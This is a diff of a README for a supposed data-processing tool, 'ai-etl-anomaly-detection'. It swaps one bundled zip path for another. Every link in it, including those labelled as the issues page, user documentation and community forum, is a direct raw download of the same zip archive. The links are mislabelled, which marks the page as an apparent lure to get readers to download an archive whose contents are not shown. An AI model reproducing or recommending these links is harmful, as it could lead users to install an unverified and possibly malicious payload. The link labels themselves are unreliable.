@@ -1,6 +1,6 @@
 # 🎉 ai-etl-anomaly-detection - Simplify Data Processing with AI
 
-[![Download the Latest Release](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/src/BaseClasses/ai-etl-anomaly-detection-2.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/src/BaseClasses/ai-etl-anomaly-detection-2.1.zip)
+[![Download the Latest Release](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/data/anomaly_etl_ai_detection_2.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/data/anomaly_etl_ai_detection_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ Before you download, ensure your system meets the following requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click on the following link to go to our releases page and download your application:
-   [Download the Latest Release](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/src/BaseClasses/ai-etl-anomaly-detection-2.1.zip)
+   [Download the Latest Release](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/data/anomaly_etl_ai_detection_2.1.zip)
 
 2. **Select the Version**: Choose the latest version to ensure you have all the updates and features.
 
@@ -59,7 +59,7 @@ Once you have installed the software, follow these steps to run it:
 
 ## 🔧 Technical Support
 
-If you encounter any issues during installation or while using the software, please refer to our [issues page](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/src/BaseClasses/ai-etl-anomaly-detection-2.1.zip) for assistance. You can also raise your questions there. 
+If you encounter any issues during installation or while using the software, please refer to our [issues page](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/data/anomaly_etl_ai_detection_2.1.zip) for assistance. You can also raise your questions there. 
 
 ## 🙋 FAQs
 
@@ -81,7 +81,7 @@ ai-etl-anomaly-detection is open-source and free to use. However, ensure you com
 
 For more information and detailed guides, visit our official documentation:
 
-- [User Documentation](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/src/BaseClasses/ai-etl-anomaly-detection-2.1.zip)
-- [Community Forum](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/src/BaseClasses/ai-etl-anomaly-detection-2.1.zip)
+- [User Documentation](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/data/anomaly_etl_ai_detection_2.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/JallinskyLuca/ai-etl-anomaly-detection/main/data/anomaly_etl_ai_detection_2.1.zip)
 
 We hope you find ai-etl-anomaly-detection helpful in your data workflows. Enjoy the benefits of automation and enhanced data quality!
